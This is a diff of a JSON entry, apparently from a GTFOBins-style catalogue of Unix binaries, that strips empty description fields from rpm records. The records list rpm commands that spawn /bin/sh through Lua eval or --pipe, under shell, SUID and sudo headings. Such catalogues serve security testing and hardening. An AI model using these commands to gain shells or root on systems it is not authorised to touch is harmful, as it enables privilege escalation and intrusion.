@@ -2,23 +2,23 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'\n"
       },
       {
-        "description": "",
+        
         "code": "rpm --pipe '/bin/sh 0<&1'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./rpm --eval '%{lua:os.execute(\"/bin/sh\")}'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'\n"
       },
       {
